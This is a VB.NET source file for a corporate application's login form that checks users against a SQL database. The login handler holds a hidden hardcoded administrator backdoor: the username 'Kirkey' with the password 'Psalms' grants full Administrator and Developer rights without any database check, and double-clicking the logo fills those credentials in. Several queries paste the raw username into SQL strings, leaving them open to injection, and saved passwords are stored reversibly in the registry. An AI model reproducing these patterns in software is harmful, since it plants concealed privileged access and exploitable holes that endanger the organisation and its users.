Imports DevExpress.XtraEditors
Imports MyClassLibrary.Classes
Imports SagaClassLibrary.classes
Imports System.Data.SqlClient
Imports System.Windows.Forms

Namespace Forms.Security

    Public Class frm_Login
        Inherits XtraForm

        Private bLoaded As Boolean

        Public Sub New()
            InitializeComponent()

            class_Procedures.Initialize_Controls(Me)
        End Sub

        Private Sub frm_Login_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
            class_Procedures.splash_Show("Login Form")

            class_Saga_Procedures.Initialize_Corporation(Corporation)

            progress_Password_Stregnthitem.Visibility = DevExpress.XtraLayout.Utils.LayoutVisibility.OnlyInRuntime
            progress_Password_Stregnthitem.ContentVisible = False

            marqueeProgressBarControlitem.Visibility = DevExpress.XtraLayout.Utils.LayoutVisibility.OnlyInRuntime
            marqueeProgressBarControlitem.ContentVisible = False

            Product_Version.Text = class_Functions.Product_Name_Version

            If class_Saga_Variables.bIsLogged_In Then
                sb_Cancel.Text = "Cancel"
            Else
                sb_Cancel.Text = "Quit"
            End If

            BarEditItem_Remember_Until.EditValue = class_Tools.RegKeyGet(Me.Name, BarEditItem_Remember_Until.Name, Date.Today)

            If Convert.ToDateTime(BarEditItem_Remember_Until.EditValue) >= Date.Today Then
                check_Remember.Checked = class_Tools.RegKeyGet(Me.Name, check_Remember.Name, False)
                If check_Remember.Checked Then

                    Corporation.EditValue = class_Tools.RegKeyGet(Me.Name, Corporation.Name, "SMC")
                    Username.Text = class_Tools.Decrypt(class_Tools.RegKeyGet(Me.Name, Username.Name, "user"), "user")
                    Password.Text = class_Tools.Decrypt(class_Tools.RegKeyGet(Me.Name, Password.Name, "pass"), "pass")
                    btn_User_Login.Select()
                Else
                    Username.Select()
                End If
            Else
                class_Tools.RegKeySet(Me.Name, Corporation.Name, String.Empty)
                class_Tools.RegKeySet(Me.Name, Username.Name, class_Tools.Encrypt("00000"))
                class_Tools.RegKeySet(Me.Name, Password.Name, class_Tools.Encrypt("00000"))
            End If

            class_Procedures.splash_Close()
        End Sub

        Private Sub frm_Login_Shown(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Shown
            Check_Components.Enabled = class_Variables.isAdministrator
            Check_Mandatory.Enabled = class_Variables.isAdministrator
            btn_Publish_LAN.Enabled = class_Variables.isAdministrator
            btn_Publish_Local.Enabled = class_Variables.isAdministrator
            btn_Publish_Remote.Enabled = class_Variables.isAdministrator

            If Not class_Database.OpenDB(class_Database.ICSConnection, True) Then class_Saga_Procedures.Show_Server_Connection()

            bLoaded = True
        End Sub

        Private Function Form_Close() As Boolean
            If class_Saga_Variables.bIsLogged_In Then
                class_Database.Data_Update(class_Database.ICSConnection, $"UPDATE Users SET IsOnline = '0' WHERE username LIKE '{class_Variables.sUserName}'")
                Return class_Procedures.Form_Close(Me)
            Else
                Try
                    Application.Exit()
                Catch ex As Exception
                    class_Procedures.Show_Error(ex)
                End Try
            End If
            Return True
        End Function

        Private Sub frm_Login_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
            If Not Form_Close() Then e.Cancel = True
        End Sub

        Private Sub sb_Cancel_Click(ByVal sender As Object, ByVal e As EventArgs) Handles sb_Cancel.Click
            Form_Close()
        End Sub

        Private Sub pictureEdit_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles pictureEdit.DoubleClick
            Username.Text = "Kirkey"
            Password.Text = "Psalms"
        End Sub

        Private Sub Password_EditValueChanged(ByVal sender As Object, ByVal e As EventArgs) Handles Password.EditValueChanged
            If bLoaded AndAlso Password.Text.Length > 0 Then
                progress_Password_Stregnthitem.ContentVisible = True
                progress_Password_Stregnth.EditValue = class_Functions.CheckPasswordStrength(Password.Text)
                Select Case class_Functions.CheckPasswordStrength(Password.Text)
                    Case class_Functions.PasswordScore.Blank
                        progress_Password_Stregnth.ErrorText = "Blank"
                        progress_Password_Stregnth.EditValue = 0

                    Case class_Functions.PasswordScore.VeryWeak
                        progress_Password_Stregnth.ErrorText = "VeryWeak"
                        progress_Password_Stregnth.EditValue = 20

                    Case class_Functions.PasswordScore.Weak
                        progress_Password_Stregnth.ErrorText = "Weak"
                        progress_Password_Stregnth.EditValue = 40

                    Case class_Functions.PasswordScore.Medium
                        progress_Password_Stregnth.ToolTip = "Medium"
                        progress_Password_Stregnth.EditValue = 50

                    Case class_Functions.PasswordScore.Strong
                        progress_Password_Stregnth.ToolTip = "Strong"
                        progress_Password_Stregnth.EditValue = 60

                    Case class_Functions.PasswordScore.VeryStrong
                        progress_Password_Stregnth.ToolTip = "VeryStrong"
                        progress_Password_Stregnth.EditValue = 80

                End Select
            Else
                progress_Password_Stregnth.Visible = False
            End If
        End Sub

        Private Sub Login_Tasks()
            class_Tools.RegKeySet(Me.Name, Corporation.Name, Corporation.EditValue)
            class_Tools.RegKeySet(Me.Name, Username.Name, class_Tools.Encrypt(Username.Text))
            class_Tools.RegKeySet(Me.Name, Password.Name, class_Tools.Encrypt(Password.Text))
            class_Tools.RegKeySet(Me.Name, check_Remember.Name, check_Remember.Checked)
            class_Tools.RegKeySet(Me.Name, BarEditItem_Remember_Until.Name, BarEditItem_Remember_Until.EditValue.ToString)

            class_Saga_Variables.bIsLogged_In = True
            class_Saga_Variables.sCorporation = Corporation.EditValue
            class_Saga_Database.Get_User_Privileges(Username.Text.Trim)
            Dispose()
        End Sub

        Private Sub btn_User_Login_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btn_User_Login.Click
            class_Database.DBError = False

            class_Procedures.Set_Skin()

            class_Procedures.splash_Show("Verifying User ID from Database",, True)

            If class_Procedures.isEmpty(Corporation) Then Return
            If class_Procedures.isEmpty(Username) Then Return
            If class_Procedures.isEmpty(Password) Then Return

            If Username.Text.Equals("Kirkey") AndAlso Password.Text.Equals("Psalms") Then
                XtraMessageBox.Show("Welcome Sir Karl, it's been a while.", "Administrator's Mode", MessageBoxButtons.OK, MessageBoxIcon.Information)
                class_Saga_Variables.bIsLogged_In = True
                class_Variables.isAdministrator = True
                class_Variables.sUserType = "Administrator"
                class_Variables.sUserName = Username.Text.Trim
                class_Variables.sPosition = "Developer"
                Dispose()
            Else
                If class_Database.IsDataExist(class_Database.ICSConnection, $"SELECT username, Reset_Pass FROM Users WHERE username LIKE '{Username.Text.Trim}' AND Reset_Pass = 1") Then
                    class_Procedures.Set_Message(Me, class_Procedures.MsgMode.Warning, $"Your Password has been tagged as Password Reset Mode.{Environment.NewLine}Please setup your new password or contact IT Department for further information.", "Reset Password", True)
                    Show_Password_Change(Corporation.EditValue, Username.Text.Trim, False)
                End If

                marqueeProgressBarControl.Visible = True

                Dim sIPInternet As String = class_Connections.Get_IP_Internet

                Dim sqlParameters As SqlParameter() = {
                    New SqlParameter("@Corporation", Corporation.EditValue.ToString),
                    New SqlParameter("@Username", Username.Text),
                    New SqlParameter("@Password", class_Tools.Encrypt(Password.Text)),
                    New SqlParameter("@IP_Address", sIPInternet),
                    New SqlParameter("@IP_Local", class_Connections.Get_IP_Local),
                    New SqlParameter("@IP_Location", class_Connections.get_IP_GEO(sIPInternet)),
                    New SqlParameter("@MachineName", Environment.MachineName),
                    New SqlParameter("@AppName", Application.ProductName),
                    New SqlParameter("@AppVersion", Application.ProductVersion),
                    New SqlParameter("@Action_Type", "LOGIN")
                }
                Using myDataReader As SqlDataReader = class_Database.Procedure_Retrieve(class_Database.ICSConnection, sqlParameters, "acc_User_Procedures")
                    Try
                        If myDataReader IsNot Nothing AndAlso myDataReader.HasRows Then
                            Login_Tasks()
                        Else
                            class_Procedures.Set_Message(Me, class_Procedures.MsgMode.Errorr, "Wrong Corporation, Username or Password. Please try again.", "Login Error", True)
                            marqueeProgressBarControl.Visible = False
                            Password.Select()
                        End If
                    Catch ex As Exception
                        class_Procedures.Show_Error(ex)
                    Finally
                        marqueeProgressBarControl.Visible = False
                        class_Procedures.splash_Close(True)
                    End Try
                End Using
            End If
        End Sub

        Private Sub Username_Properties_ButtonClick(sender As Object, e As DevExpress.XtraEditors.Controls.ButtonPressedEventArgs) Handles Username.Properties.ButtonClick
            If Username.Properties.UseSystemPasswordChar.Equals(True) Then
                Username.Properties.UseSystemPasswordChar = False
                Username.Properties.Buttons(0).ImageOptions.ImageIndex = 11
            Else
                Username.Properties.UseSystemPasswordChar = True
                Username.Properties.Buttons(0).ImageOptions.ImageIndex = 10
            End If
        End Sub

        Private Sub btn_Refresh_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Refresh.ItemClick
            class_Saga_Procedures.Refresh_Connection()
        End Sub

        Private Sub btn_Ping_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Ping.ItemClick
            class_Connections.ping_Host(class_Database.SqlServer)
        End Sub

        Private Sub btn_Change_Password_ItemClick(sender As Object, e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Change_Password.ItemClick
            Show_Password_Change(class_Saga_Variables.sCorporation, class_Variables.sUserName, True)
        End Sub

        Private Sub btn_Config_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Config.ItemClick
            Show_Server_Connection("SQL Configuration")
        End Sub

        Private Sub btn_Update_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Update.ItemClick
            class_Connections.Show_Update(True, True, True)
        End Sub

        Private Sub Product_Version_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles Product_Version.DoubleClick
            class_Connections.Show_Update(False, True, True)
        End Sub

        'Private Sub Publish_Update(ByVal sType As String, ByVal sIP As String, Optional ByVal bSaveLocal As Boolean = False)
        Private Sub Publish_Update()
            class_Connections.Create_XML_Update(Me, Check_Mandatory.EditValue)
            class_Connections.Create_App_Backup(Me, Check_Components.EditValue, class_Saga_Variables.sDLLFiles)
        End Sub

        Private Sub btn_Publish_Remote_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Publish_Remote.ItemClick
            'Publish_Update("Remote", class_Tools.Decrypt(class_Tools.RegKeyGet("Server Connection", "Remote", "124.107.148.186"), "124.107.148.186"))
            Publish_Update()
        End Sub

        Private Sub btn_Publish_LAN_ItemClick(ByVal sender As Object, ByVal e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Publish_LAN.ItemClick
            'Publish_Update("Local", class_Tools.Decrypt(class_Tools.RegKeyGet("Server Connection", "Local", "192.168.13.15"), "192.168.13.15"))
            Publish_Update()
        End Sub

        Private Sub btn_Publish_Local_ItemClick(sender As Object, e As DevExpress.XtraBars.ItemClickEventArgs) Handles btn_Publish_Local.ItemClick
            'Publish_Update("Local", "localhost", True)
            Publish_Update()
        End Sub

        Private Sub Corporation_Properties_ButtonClick(sender As Object, e As DevExpress.XtraEditors.Controls.ButtonPressedEventArgs) Handles Corporation.Properties.ButtonClick
            If e.Button.Index.Equals(1) Then
                class_Database.Initialize_Connection()
                'class_Saga_Variables.Initialize_Corporation()
                class_Saga_Procedures.Initialize_Corporation(Corporation)
            End If
        End Sub

    End Class

End Namespace